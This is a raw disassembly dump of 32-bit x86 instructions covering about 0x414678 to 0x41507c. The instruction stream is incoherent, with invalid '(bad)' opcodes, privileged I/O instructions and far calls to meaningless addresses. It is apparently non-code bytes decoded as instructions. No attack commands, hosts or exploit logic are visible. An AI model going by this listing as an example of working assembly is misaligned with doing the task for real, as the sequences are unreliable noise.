  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xb
  414681:	sbb    DWORD PTR [eax],0xd6f559
  414687:	add    BYTE PTR ds:0x63000001,al
  41468d:	int    0xb9
  41468f:	jbe    0x414692
  414691:	cmp    eax,0x2420f0ce
  414696:	and    al,0x22
  414698:	aam    0xe
  41469a:	pop    ebp
  41469b:	push   eax
  41469c:	test   eax,ebx
  41469e:	stos   BYTE PTR es:[edi],al
  41469f:	push   ss
  4146a0:	xchg   edx,eax
  4146a1:	inc    eax
  4146a2:	retf   
  4146a3:	cmp    ch,dl
  4146a5:	lds    esi,FWORD PTR [edx+edi*1+0x6eff59ad]
  4146ac:	hlt    
  4146ad:	pop    esp
  4146ae:	sar    eax,1
  4146b0:	pop    es
  4146b1:	adc    DWORD PTR ds:0xf2d8f9dd,esp
  4146b7:	sbb    al,0x7a
  4146b9:	ins    BYTE PTR es:[edi],dx
  4146ba:	les    ebx,FWORD PTR [ecx]
  4146bc:	cmp    DWORD PTR [ebx-0xb09b4d6],ebx
  4146c2:	rcr    DWORD PTR [edi+0x6d],1
  4146c5:	fstp   DWORD PTR [esi-0x1d0737cc]
  4146cb:	fcomp  DWORD PTR [ebx+0x199c723e]
  4146d1:	aam    0x34
  4146d3:	pop    eax
  4146d4:	mov    al,BYTE PTR [ebx+0x33]
  4146d7:	mov    esp,0x2f4a0d8f
  4146dc:	push   cs
  4146dd:	sbb    BYTE PTR cs:[ecx+0xa],cl
  4146e1:	sti    
  4146e2:	mov    DWORD PTR [ebp+0x70],ebx
  4146e5:	pop    ecx
  4146e6:	out    dx,al
  4146e7:	sub    BYTE PTR [eax+0x5f3a142],cl
  4146ed:	aas    
  4146ee:	mov    edx,0x8299d5da
  4146f3:	push   ds
  4146f4:	les    ecx,FWORD PTR [ecx+0x19]
  4146f7:	ret    
  4146f8:	aam    0xc9
  4146fa:	stos   BYTE PTR es:[edi],al
  4146fb:	xlat   BYTE PTR ds:[ebx]
  4146fc:	imul   ecx,DWORD PTR [ecx-0x7d],0xfffffffa
  414700:	adc    eax,0x4816fbd0
  414705:	popf   
  414706:	hlt    
  414707:	pop    esi
  414708:	mov    cl,0x15
  41470a:	icebp  
  41470b:	addr16 repnz in al,dx
  41470e:	mov    cl,0x9e
  414710:	adc    DWORD PTR [esi],ecx
  414712:	cmp    eax,0xfed4a7d3
  414717:	outs   dx,DWORD PTR ds:[esi]
  414718:	cmp    WORD PTR [eax],0x8d32
  41471d:	imul   DWORD PTR [eax+eax*2-0x2b]
  414721:	outs   dx,DWORD PTR ds:[esi]
  414722:	xor    edi,DWORD PTR [ebx]
  414724:	(bad)  
  414725:	sub    ebp,DWORD PTR es:0xe213c250
  41472c:	mov    ds:0xe4fce820,eax
  414731:	adc    DWORD PTR [edi-0x98bec0a],eax
  414737:	and    al,0xd1
  414739:	mov    ebp,0xe0130d97
  41473e:	cmp    edx,ebx
  414740:	inc    edi
  414741:	mov    al,ds:0xcbf120a4
  414746:	std    
  414747:	xchg   esi,eax
  414748:	fwait
  414749:	retf   
  41474a:	imul   ebx,DWORD PTR ds:0x1265c623,0x2
  414751:	inc    eax
  414752:	xchg   DWORD PTR [esi+0x71],esp
  414755:	mov    ds:0x741ff9ef,eax
  41475a:	adc    cl,BYTE PTR [edx]
  41475c:	out    0x8b,eax
  41475e:	dec    ebp
  41475f:	std    
  414760:	adc    dh,BYTE PTR [edx+0x380ea095]
  414766:	jb     0x414792
  414768:	(bad)  
  414769:	lods   al,BYTE PTR ds:[esi]
  41476a:	push   esp
  41476b:	fmul   st(3),st
  41476d:	push   cs
  41476e:	and    dl,bh
  414770:	repz mov ch,0xcd
  414773:	adc    BYTE PTR [esi+0x74],bh
  414776:	adc    al,BYTE PTR [eax+0x38]
  414779:	add    eax,0xcbcd79ac
  41477e:	push   esi
  41477f:	xchg   esi,eax
  414780:	pop    es
  414781:	(bad)  
  414782:	rep stos DWORD PTR es:[edi],eax
  414784:	call   0x1e34d06a
  414789:	out    dx,eax
  41478a:	ror    DWORD PTR [esi+0x1b91363],0xf7
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xd9c6e9ed
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0xb8000001
  41480d:	mov    ebx,0xfe728e80
  414812:	pop    eax
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	pop    esp
  414815:	in     eax,dx
  414816:	shl    BYTE PTR [edx],0xfd
  414819:	call   0x5ea4:0xb646c9b3
  414820:	pop    esp
  414821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414822:	fstp   TBYTE PTR [esi+0x7]
  414825:	sub    ebp,DWORD PTR [edi+0x48]
  414828:	mov    bh,0x8a
  41482a:	in     al,dx
  41482b:	outs   dx,BYTE PTR ds:[esi]
  41482c:	mov    eax,ds:0xc525a844
  414831:	test   eax,0xf7155ce9
  414836:	add    ebx,DWORD PTR [esi+0x45]
  414839:	xchg   ecx,eax
  41483a:	sti    
  41483b:	cmp    BYTE PTR [esi],al
  41483d:	fcmovnu st,st(2)
  41483f:	inc    ecx
  414840:	push   ebx
  414841:	clc    
  414842:	ret    0xe899
  414845:	xchg   ecx,eax
  414846:	sbb    al,0x2
  414848:	mov    edi,0x49feed11
  41484d:	sub    ebp,DWORD PTR [eax+eax*8]
  414850:	scas   eax,DWORD PTR es:[edi]
  414851:	dec    edx
  414852:	adc    DWORD PTR ds:0x6eb81be5,edx
  414858:	jge    0x414828
  41485a:	or     al,0xdb
  41485c:	rcl    bp,1
  41485f:	dec    ebx
  414860:	(bad)  
  414861:	mov    ecx,0x3e37c22a
  414866:	pop    ss
  414867:	cli    
  414868:	xchg   ebx,eax
  414869:	mov    dh,0x34
  41486b:	test   BYTE PTR [ecx-0x61],bh
  41486e:	and    DWORD PTR [edi-0xa],edx
  414871:	and    ah,al
  414873:	ror    BYTE PTR [ecx+0x5f6cf139],0x86
  41487a:	popf   
  41487b:	cmp    DWORD PTR [edx+0x78fd1d8d],edx
  414881:	pop    es
  414882:	int    0x37
  414884:	outs   dx,DWORD PTR ds:[esi]
  414885:	xchg   edi,eax
  414886:	cmc    
  414887:	clc    
  414888:	leave  
  414889:	aaa    
  41488a:	xchg   esp,eax
  41488b:	mov    ds:0xc3e154fd,eax
  414890:	(bad)  
  414891:	cmc    
  414892:	xchg   ebx,eax
  414893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414894:	sub    esi,DWORD PTR [ebx]
  414896:	out    dx,al
  414897:	mov    ds:0x4bead81f,eax
  41489c:	xchg   esi,eax
  41489d:	enter  0x4478,0x99
  4148a1:	adc    BYTE PTR [ebx-0x37],cl
  4148a4:	into   
  4148a5:	fs je  0x414881
  4148a8:	mov    esi,0x61a5445d
  4148ad:	test   BYTE PTR [esi-0x6],ah
  4148b0:	or     eax,0x853954fe
  4148b5:	sbb    eax,0x26b85c6
  4148ba:	call   DWORD PTR [edx+0x24]
  4148bd:	fcom   QWORD PTR [ebp-0x50]
  4148c0:	mov    ds:0xb785e14b,eax
  4148c5:	daa    
  4148c6:	aaa    
  4148c7:	mov    dh,0xf9
  4148c9:	cmp    al,0x5a
  4148cb:	xchg   esi,eax
  4148cc:	inc    ecx
  4148cd:	fist   WORD PTR [esi+ebx*2]
  4148d0:	lds    edx,FWORD PTR [esi+0x2c]
  4148d3:	jo     0x414929
  4148d5:	push   ss
  4148d6:	(bad)  
  4148d7:	and    eax,0x5f5b8e4f
  4148dc:	push   edx
  4148dd:	ins    DWORD PTR es:[edi],dx
  4148de:	sbb    DWORD PTR [ebx],ecx
  4148e0:	and    dh,BYTE PTR [esi-0x6a703105]
  4148e6:	sub    eax,0x8b3cf070
  4148eb:	jo     0x41486e
  4148ed:	xor    DWORD PTR [eax+ebx*4-0x2be68ff3],esi
  4148f4:	outs   dx,DWORD PTR ds:[esi]
  4148f5:	(bad)  
  4148f6:	dec    ebp
  4148f7:	jp     0x41491c
  4148f9:	repnz inc ecx
  4148fb:	jne    0x414963
  4148fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148fe:	xlat   BYTE PTR ds:[ebx]
  4148ff:	clc    
  414900:	popa   
  414901:	cs ja  0x414893
  414904:	ror    BYTE PTR [edx],cl
  414906:	add    al,0x43
  414909:	mov    ss,WORD PTR [edx+0x2c67d265]
  41490f:	sbb    DWORD PTR [edi+0x0],ecx
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	stos   BYTE PTR es:[edi],al
  414981:	fiadd  WORD PTR [esp+ecx*8+0xd8ff]
  414988:	add    eax,0x90000001
  41498d:	jmp    0x414959
  41498f:	in     al,0x55
  414991:	or     eax,0x8f5b17c5
  414996:	fsubr  st,st(3)
  414998:	and    dl,cl
  41499a:	test   DWORD PTR ds:0x79599789,0x48af9304
  4149a4:	ss clc 
  4149a6:	test   al,0x8b
  4149a8:	pop    ss
  4149a9:	mov    ds:0x8da62ede,al
  4149ae:	mov    cl,0x90
  4149b0:	mov    eax,ds:0x83d5ae82
  4149b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149b6:	cdq    
  4149b7:	mov    BYTE PTR ds:0x5059b005,dh
  4149bd:	enter  0x2fb4,0x2e
  4149c1:	mov    dl,al
  4149c3:	sub    ebp,DWORD PTR ds:0xebd4541c
  4149c9:	mov    ds:0x36734c93,eax
  4149ce:	test   al,0xbf
  4149d0:	mov    dl,0x89
  4149d2:	mov    WORD PTR [ebx-0x2cd11a1c],fs
  4149d8:	ins    DWORD PTR es:[edi],dx
  4149d9:	xchg   esp,eax
  4149da:	mov    bh,0xe0
  4149dc:	dec    ecx
  4149dd:	jns    0x41498e
  4149df:	inc    ecx
  4149e0:	addr16 gs sar ch,cl
  4149e4:	and    bl,BYTE PTR [esi+0x5c6dd967]
  4149ea:	push   0xffffff93
  4149ec:	sar    cl,0x10
  4149ef:	cli    
  4149f0:	(bad)  
  4149f1:	jmp    0x414976
  4149f3:	loope  0x4149ec
  4149f5:	aaa    
  4149f6:	sub    eax,ecx
  4149f8:	dec    esp
  4149f9:	mov    al,ds:0xf8a1fcad
  4149fe:	lods   al,BYTE PTR ds:[esi]
  4149ff:	and    eax,0x74edff3c
  414a04:	cwde   
  414a05:	es addr16 gs sti 
  414a09:	pop    ebx
  414a0a:	mov    dl,0x4a
  414a0c:	push   ecx
  414a0d:	test   eax,0x21259ca1
  414a12:	pop    ebp
  414a13:	pop    esp
  414a14:	dec    edi
  414a15:	pop    ebx
  414a16:	out    dx,eax
  414a17:	mov    cl,0x54
  414a19:	sub    eax,0x6251d0e1
  414a1e:	xor    ebx,ecx
  414a20:	stos   DWORD PTR es:[edi],eax
  414a21:	and    ebx,DWORD PTR [edi-0x79]
  414a24:	jo     0x414a25
  414a26:	pop    ecx
  414a27:	sbb    dl,ah
  414a29:	add    al,0xb7
  414a2b:	lock mov dh,0xea
  414a2e:	mov    dl,0x5
  414a30:	sbb    eax,0xefb2bea9
  414a35:	in     al,0xf2
  414a37:	fisttp WORD PTR [edx+0x778914b2]
  414a3d:	and    dl,al
  414a3f:	push   edi
  414a40:	arpl   WORD PTR [ebx],bx
  414a42:	pop    ecx
  414a43:	add    BYTE PTR [esi-0x4ca70c50],0x99
  414a4a:	fucomi st,st(7)
  414a4c:	or     al,0x71
  414a4e:	mov    ebp,0x6ad0b501
  414a53:	jp     0x414a58
  414a55:	loopne 0x414a7e
  414a57:	(bad)
  414a5a:	mov    dh,0xd
  414a5c:	ins    BYTE PTR es:[edi],dx
  414a5d:	jl     0x414ac4
  414a5f:	sub    eax,0xe5507920
  414a64:	ss cli 
  414a66:	jne    0x414a9e
  414a68:	cs ins BYTE PTR es:[edi],dx
  414a6a:	jnp    0x414a1e
  414a6c:	cmp    eax,ebp
  414a6e:	pop    es
  414a6f:	jbe    0x414a9c
  414a71:	add    ch,BYTE PTR [ebx-0x7b]
  414a74:	cmp    eax,0x6db1c81c
  414a79:	sub    BYTE PTR [eax-0x228d8026],dh
  414a7f:	rol    BYTE PTR [edi+0x5b],0xe7
  414a83:	mov    ebp,0x9ef97ed5
  414a88:	adc    ecx,ebx
  414a8a:	inc    eax
  414a8b:	leave  
  414a8c:	adc    bl,BYTE PTR [edx]
  414a8e:	xchg   edx,eax
  414a8f:	repz aas 
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   sp,dx
  414b01:	sub    DWORD PTR [ebx+0xda04bc],eax
  414b07:	add    BYTE PTR ds:0x27000001,al
  414b0d:	pop    ebx
  414b0e:	imul   esi,DWORD PTR [edi+0xe221f2a],0xffffffd8
  414b15:	ror    eax,1
  414b17:	xor    ebx,DWORD PTR [ebx]
  414b19:	xchg   ecx,eax
  414b1a:	pop    es
  414b1b:	sbb    al,0x40
  414b1d:	xchg   edi,eax
  414b1e:	dec    ebx
  414b1f:	mov    dl,0xd7
  414b21:	or     ebp,DWORD PTR [eax]
  414b23:	cmp    DWORD PTR ds:0x18024e2c,esp
  414b29:	cmp    eax,0x9eb1dcc
  414b2e:	test   BYTE PTR [edi-0x60],dl
  414b31:	lock lock inc edx
  414b34:	mov    bl,dh
  414b36:	cli    
  414b37:	pop    edx
  414b38:	or     ch,dh
  414b3a:	and    al,0xc4
  414b3c:	jne    0x414b36
  414b3e:	cmp    dh,BYTE PTR [edx+0x51]
  414b41:	cmp    esi,ebx
  414b43:	inc    ebp
  414b44:	nop
  414b45:	shl    BYTE PTR [ebx],1
  414b47:	jb     0x414ad3
  414b49:	xor    BYTE PTR [edx+0x35],al
  414b4c:	pop    es
  414b4d:	out    0xc2,al
  414b4f:	icebp  
  414b50:	leave  
  414b51:	das    
  414b52:	push   esi
  414b53:	adc    dh,BYTE PTR [eax-0x5bc5b670]
  414b59:	outs   dx,BYTE PTR ds:[esi]
  414b5a:	inc    ebx
  414b5b:	mov    edx,0x9719a343
  414b60:	in     al,0x69
  414b62:	sub    ch,BYTE PTR [esi-0x50]
  414b65:	cmp    eax,0x3ee67d44
  414b6a:	cwde   
  414b6b:	std    
  414b6c:	test   BYTE PTR [eax+0x23],ch
  414b6f:	add    dl,BYTE PTR [ebx-0x29]
  414b72:	aaa    
  414b73:	(bad)  
  414b75:	xor    eax,0xd8e5e51
  414b7a:	(bad)  
  414b7d:	dec    ecx
  414b7e:	dec    edx
  414b7f:	repz mov esp,ebx
  414b82:	add    DWORD PTR ss:[ebx+0x4d],esp
  414b86:	clc    
  414b87:	inc    ebx
  414b88:	sub    ebx,edi
  414b8a:	dec    esp
  414b8b:	lock mov eax,ds:0xbeee47c5
  414b91:	jno    0x414bee
  414b93:	jmp    0x87a1d25c
  414b98:	mov    WORD PTR [ebx+0x23],gs
  414b9b:	mov    dh,0xce
  414b9d:	xchg   ecx,eax
  414b9e:	loop   0x414b8d
  414ba0:	sbb    al,0x84
  414ba2:	sub    BYTE PTR [ebp-0x543a418b],dh
  414ba8:	fstp   st(4)
  414baa:	sti    
  414bab:	popa   
  414bac:	xchg   edi,eax
  414bad:	scas   eax,DWORD PTR es:[edi]
  414bae:	xor    BYTE PTR [ebp+0x78a76bff],al
  414bb4:	inc    ecx
  414bb5:	xlat   BYTE PTR ds:[ebx]
  414bb6:	bound  ebx,QWORD PTR [ebp+0x8]
  414bb9:	push   ecx
  414bba:	mov    ss,edx
  414bbc:	cmp    esi,esi
  414bbe:	call   0xdfd4:0x95620cf1
  414bc5:	adc    eax,0x218ce572
  414bca:	sub    esi,DWORD PTR ds:0xc3013efb
  414bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bd1:	push   0xffffffbb
  414bd3:	pop    ds
  414bd4:	push   ecx
  414bd5:	out    0x9d,eax
  414bd7:	cdq    
  414bd8:	jp     0x414bad
  414bda:	xchg   esi,eax
  414bdb:	(bad)  
  414bdc:	xchg   esi,eax
  414bdd:	ret    0x5718
  414be0:	sub    eax,0xade6ed32
  414be5:	cmc    
  414be6:	hlt    
  414be7:	mov    esp,0xb1393394
  414bec:	ror    bl,cl
  414bee:	fmul   DWORD PTR [edx+0x5c5daa19]
  414bf4:	call   0x87693b22
  414bf9:	pop    ds
  414bfa:	xchg   esp,eax
  414bfb:	inc    ebp
  414bfc:	mov    ds:0xbf8f0220,al
  414c01:	(bad)  
  414c02:	ins    BYTE PTR es:[edi],dx
  414c03:	icebp  
  414c04:	mov    edi,0xdd13c5ef
  414c09:	fwait
  414c0a:	test   DWORD PTR [ecx+ebp*2],ebx
  414c0d:	push   0xde617d
	...
  414c72:	add    BYTE PTR [eax],al
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	cs adc ebp,ebx
  414c81:	mov    cl,0x94
  414c83:	pop    esp
  414c84:	or     ebx,ebx
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    eax,0xc4000001
  414c8d:	ret    
  414c8e:	ret    
  414c8f:	cdq    
  414c90:	cwde   
  414c91:	outs   dx,BYTE PTR ds:[esi]
  414c92:	jge    0x414c57
  414c94:	gs jnp 0x414c7f
  414c97:	add    eax,0x64ed63d7
  414c9c:	mov    esi,gs
  414c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c9f:	or     ch,al
  414ca1:	push   es
  414ca2:	xchg   BYTE PTR [edi],bl
  414ca4:	push   edx
  414ca5:	addr16 jae 0x414c43
  414ca8:	lea    esi,[eax-0x7d]
  414cab:	adc    eax,0x4f9c3513
  414cb0:	or     BYTE PTR [eax],bh
  414cb2:	loope  0x414caf
  414cb4:	test   cl,0x5d
  414cb7:	and    DWORD PTR [ebp+0x21],0x4f
  414cbb:	dec    BYTE PTR [esi+0x4c81d537]
  414cc1:	jb     0x414cfa
  414cc3:	xchg   edx,eax
  414cc4:	int    0xbe
  414cc6:	push   eax
  414cc7:	test   DWORD PTR [edi],edx
  414cc9:	and    DWORD PTR [ebx],0x6e47d576
  414ccf:	inc    esi
  414cd0:	ins    BYTE PTR es:[edi],dx
  414cd1:	les    ecx,FWORD PTR [eax+0x53]
  414cd4:	xor    ah,BYTE PTR ds:0x6f6f7168
  414cda:	xchg   edi,eax
  414cdb:	jl     0x414d2c
  414cdd:	cmp    bl,BYTE PTR [esi+esi*8]
  414ce0:	stos   DWORD PTR es:[edi],eax
  414ce1:	mov    esp,0x80395cad
  414ce6:	js     0x414cf6
  414ce8:	push   0xab0a9a08
  414ced:	aad    0x8d
  414cef:	dec    ecx
  414cf0:	mov    bl,dl
  414cf2:	adc    esp,DWORD PTR [ecx-0x16f96b06]
  414cf8:	mov    DWORD PTR ds:0xd938c7ea,esp
  414cfe:	fimul  DWORD PTR [eax+0x7a]
  414d01:	cmp    eax,0x35f5bae6
  414d06:	xchg   BYTE PTR [edx-0x5d],dl
  414d09:	stos   BYTE PTR es:[edi],al
  414d0a:	ins    BYTE PTR es:[edi],dx
  414d0b:	imul   ebp,DWORD PTR [edi],0xffffff83
  414d0e:	xor    al,0x88
  414d10:	fcom   QWORD PTR [ebx+ebp*8+0x24]
  414d14:	mov    ch,0xc0
  414d16:	push   0xcf3608c5
  414d1b:	(bad)  
  414d1c:	dec    ecx
  414d1d:	inc    ebp
  414d1e:	cdq    
  414d1f:	jno    0x414d13
  414d21:	inc    esp
  414d22:	jno    0x414d1b
  414d24:	(bad)
  414d28:	sub    cl,ch
  414d2a:	bnd jne 0x414d8c
  414d2d:	mov    edi,0x1600d92e
  414d32:	arpl   WORD PTR [ebx+0x2edc7705],cx
  414d38:	inc    eax
  414d39:	in     eax,dx
  414d3a:	jo     0x414d05
  414d3c:	jno    0x414d01
  414d3e:	mov    dh,0x73
  414d40:	and    eax,0xa7105820
  414d45:	test   eax,0x4920701c
  414d4a:	push   edx
  414d4b:	xchg   ebx,eax
  414d4c:	mov    ah,0x53
  414d4e:	jo     0x414d47
  414d50:	fidivr DWORD PTR [edi-0x44]
  414d53:	jp     0x414d39
  414d55:	jbe    0x414d72
  414d57:	stos   BYTE PTR es:[edi],al
  414d58:	cli    
  414d59:	jle    0x414d73
  414d5b:	xchg   esi,eax
  414d5c:	data16 daa 
  414d5e:	cmp    al,cl
  414d60:	ins    BYTE PTR es:[edi],dx
  414d61:	scas   eax,DWORD PTR es:[edi]
  414d62:	sbb    ah,BYTE PTR [edi-0x149694c]
  414d68:	in     eax,0xea
  414d6a:	xor    bl,BYTE PTR [edi]
  414d6c:	ret    
  414d6d:	nop
  414d6e:	ja     0x414d31
  414d70:	in     al,dx
  414d71:	xchg   BYTE PTR [eax+ecx*8],bl
  414d74:	pop    es
  414d75:	and    ah,dh
  414d77:	fistp  WORD PTR [esi-0x4f]
  414d7a:	test   DWORD PTR [esi-0x54],0x1cbfc6e9
  414d81:	pop    ds
  414d82:	lea    ebp,[ebp+0x70ed2176]
  414d88:	mov    ebx,0xfbac2ad2
  414d8d:	jge    0x414dd4
  414d8f:	je     0x414d39
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x2b0c5e8f
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0xc9000001,al
  414e0d:	in     al,0xca
  414e0f:	cmc    
  414e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e11:	push   fs
  414e13:	adc    esi,esp
  414e15:	ss popf 
  414e17:	sbb    esp,0xffffffbf
  414e1a:	mov    edi,0x8faf6f52
  414e1f:	sub    bl,dl
  414e21:	push   0x9b2438fa
  414e26:	xchg   esp,eax
  414e27:	retf   0xd92c
  414e2a:	inc    eax
  414e2b:	fist   DWORD PTR [eax]
  414e2d:	hlt    
  414e2e:	push   0x4d
  414e30:	mov    ecx,0xd842f0d
  414e35:	inc    edi
  414e36:	aas    
  414e37:	aas    
  414e38:	int3   
  414e39:	arpl   ax,ax
  414e3b:	fisub  DWORD PTR [ebp-0x629d9043]
  414e41:	cmp    BYTE PTR es:[eax],cl
  414e44:	aad    0xc2
  414e46:	pop    ss
  414e47:	iret   
  414e48:	pop    fs
  414e4a:	inc    esi
  414e4b:	stc    
  414e4c:	jae    0x414e27
  414e4e:	(bad)  
  414e4f:	and    DWORD PTR [edi+0x5aed1e65],ecx
  414e55:	sar    DWORD PTR [edx],1
  414e57:	push   0x8945bd94
  414e5c:	gs cdq 
  414e5e:	into   
  414e5f:	inc    eax
  414e60:	lahf   
  414e61:	(bad)  
  414e62:	fs jp  0x414e7c
  414e65:	popf   
  414e66:	or     DWORD PTR ds:0xe2bda149,edx
  414e6c:	fcmovnb st,st(7)
  414e6e:	or     DWORD PTR [edx+eax*1+0xe1d8a57],ebx
  414e75:	ja     0x414e04
  414e77:	mov    BYTE PTR [edi],bl
  414e79:	iret   
  414e7a:	leave  
  414e7b:	jne    0x414ecf
  414e7d:	pop    ecx
  414e7e:	push   cs
  414e7f:	stos   DWORD PTR es:[edi],eax
  414e80:	rcl    BYTE PTR [ebx-0x4c41aec3],1
  414e86:	ins    DWORD PTR es:[edi],dx
  414e87:	leave  
  414e88:	ds pop ebp
  414e8a:	jg     0x414e9b
  414e8c:	dec    ebx
  414e8d:	mov    eax,0x74ef2ea4
  414e92:	lods   al,BYTE PTR ds:[esi]
  414e93:	and    ebx,DWORD PTR [edx]
  414e95:	setns  BYTE PTR [eax-0x46]
  414e99:	sti    
  414e9a:	js     0x414eb6
  414e9c:	push   ss
  414e9d:	and    al,BYTE PTR [ebx+0x55]
  414ea0:	pop    esi
  414ea1:	mov    esi,0xe746024c
  414ea6:	mov    bl,0xaa
  414ea8:	pop    esi
  414ea9:	scas   eax,DWORD PTR es:[edi]
  414eaa:	sub    eax,ecx
  414eac:	out    dx,al
  414ead:	mov    ds:0xbdff397d,eax
  414eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb3:	mov    ds:0xc1bf412b,eax
  414eb8:	cmp    edi,DWORD PTR [edx+0x493c3cfe]
  414ebe:	adc    DWORD PTR ds:0x48d0ff3c,edx
  414ec4:	retf   
  414ec5:	adc    BYTE PTR ds:0x58f4e65c,bl
  414ecb:	jmp    0xb19e7e0d
  414ed0:	fnsave [edi-0x47d118ac]
  414ed6:	and    al,0x14
  414ed9:	fld    DWORD PTR [ebx-0x79]
  414edc:	jecxz  0x414ee8
  414ede:	cmp    ecx,DWORD PTR [esi]
  414ee0:	sbb    bh,BYTE PTR [edx+esi*1+0x56]
  414ee4:	sbb    al,0xe7
  414ee6:	fs inc edi
  414ee8:	bound  ebp,QWORD PTR [ecx*2+0x2f967c0a]
  414eef:	rcr    DWORD PTR [ebp+0x4f1ea307],cl
  414ef5:	push   ebp
  414ef6:	cmp    BYTE PTR [ebx],bh
  414ef8:	pop    edx
  414ef9:	sbb    al,0x24
  414efb:	pop    esi
  414efc:	mov    dh,0x2b
  414efe:	in     al,0x90
  414f00:	xchg   DWORD PTR [ecx+0x23380858],ebx
  414f06:	xchg   ebp,eax
  414f07:	enter  0x656b,0xa8
  414f0b:	push   edx
  414f0c:	(bad)  
  414f0d:	(bad)  
  414f0e:	xchg   edi,eax
  414f0f:	inc    eax
  414f10:	ret    
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xf18175a
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0xd4000001
  414f8d:	mov    ecx,0x73c1e7bb
  414f92:	mov    eax,ds:0xc80c63bc
  414f97:	pop    edx
  414f98:	mov    ah,0xd9
  414f9a:	mov    eax,0x54e015e5
  414f9f:	lods   eax,DWORD PTR ds:[esi]
  414fa0:	cmp    eax,0xf8ac4533
  414fa5:	mov    eax,0x9b68273c
  414faa:	adc    DWORD PTR ds:0x977dbb36,edi
  414fb0:	shl    BYTE PTR [ecx-0x2aed7580],1
  414fb6:	or     BYTE PTR [ebp-0x6],al
  414fb9:	pop    esp
  414fba:	sbb    eax,0x88656124
  414fbf:	sub    al,0x18
  414fc1:	jbe    0x414f9e
  414fc3:	test   BYTE PTR [esi],bl
  414fc5:	ror    DWORD PTR [ecx-0x26],1
  414fc8:	jmp    0x3ee0:0x83a05b9
  414fcf:	push   0x4d
  414fd1:	mov    bl,0xd5
  414fd3:	mov    eax,DWORD PTR [ecx]
  414fd5:	cli    
  414fd6:	lahf   
  414fd7:	mov    dh,0x7b
  414fd9:	push   0xffffffb9
  414fdb:	xor    dl,BYTE PTR gs:[edx]
  414fde:	sbb    DWORD PTR [ebp+0x760decc],esp
  414fe4:	data16 dec BYTE PTR [ebx+edi*1+0x473d4e93]
  414fec:	push   es
  414fed:	sbb    eax,0x57af04c8
  414ff2:	mov    bh,0x9b
  414ff4:	jmp    0x41506e
  414ff6:	push   0x3d
  414ff8:	or     DWORD PTR [ecx],ebx
  414ffa:	sub    cl,al
  414ffc:	adc    BYTE PTR [ebp-0x761de81c],0x2
  415003:	pop    ecx
  415004:	stos   DWORD PTR es:[edi],eax
  415005:	shl    BYTE PTR [ebx+0x2543d113],cl
  41500b:	outs   dx,DWORD PTR ds:[esi]
  41500c:	in     eax,0x52
  41500e:	sub    bh,BYTE PTR [ebx+0x424971]
  415014:	mov    dl,0x6b
  415016:	popa   
  415017:	adc    eax,DWORD PTR [edx-0x5f]
  41501a:	popw   ds
  41501c:	arpl   WORD PTR [ebp+edi*2+0x37c1cfcf],ax
  415023:	add    al,0xec
  415025:	std    
  415026:	jno    0x415061
  415028:	shl    BYTE PTR [ebx+0x7222213b],cl
  41502e:	xor    eax,0xaf0eb252
  415033:	pop    esp
  415034:	dec    esi
  415035:	js     0x415094
  415037:	or     eax,0x1049fef2
  41503c:	dec    esi
  41503d:	add    al,0x56
  41503f:	and    DWORD PTR [edi-0x59f197ac],esp
  415045:	aam    0x24
  415047:	test   BYTE PTR [edi+0x5889aa65],dl
  41504d:	mov    BYTE PTR [ecx-0x3c],dh
  415050:	leave  
  415051:	(bad)  
  415052:	stos   BYTE PTR es:[edi],al
  415053:	inc    ecx
  415054:	mov    ch,0xff
  415057:	outs   dx,DWORD PTR ds:[esi]
  415058:	scas   al,BYTE PTR es:[edi]
  415059:	and    esi,DWORD PTR [ebp+eiz*1+0x48]
  41505d:	adc    eax,0xcaa7e772
  415062:	pop    edx
  415063:	and    ebx,DWORD PTR [esi]
  415065:	cs add eax,0x8ca5831c
  41506b:	cdq    
  41506c:	pop    ebp
  41506d:	rcr    ebx,1
  41506f:	mov    ebx,0x9d93a26e
  415074:	cmp    BYTE PTR [ebx+0xb],ch
  415077:	stos   BYTE PTR es:[edi],al
  415078:	inc    edi
  415079:	mov    dl,0x2a
  41507b:	aas    
  41507c:	dec    edx
